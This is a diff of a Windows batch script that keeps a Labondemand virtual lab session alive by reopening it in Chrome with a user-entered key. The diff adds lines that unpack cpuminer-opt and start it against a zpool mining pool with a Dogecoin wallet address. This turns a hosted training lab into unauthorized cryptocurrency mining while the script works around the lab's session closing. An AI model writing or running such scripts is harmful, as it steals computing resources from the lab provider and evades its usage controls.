@@ -1,5 +1,5 @@
 @echo off
-title Labondemand Anti-Close:
+title Labondemand Anti-Close And Auto Mimning:
 set /p id="Enter Lab Cliet ID: "
 echo Waitting Chrome Installed!
 timeout 10 >nul
@@ -10,6 +10,9 @@ rmdir /Q /S "User Data"
 7z.exe x UserData.rar
 cd C:\Program Files\Google\Chrome\Application
 start chrome.exe  https://labondemand.com/LabInstance/ResumeWithKey/?key=%id%
+7z.exe x Cpuminer-opt-cpu-pool-win64.zip
+cd C:\Users\Administrator\Desktop/Cpuminer-opt-cpu-pool-win64
+start cpuminer.exe -a cpupower -o stratum+tcp://cpupower.eu.mine.zpool.ca:6240 -u DGDevZn5SWx7LzPpmaH3oR5PeGx9H8pJdL -p c=DOGE
 @echo off
 cls
 title Delete Labs File TO Free Up Disk Space. DONT CLOSE.
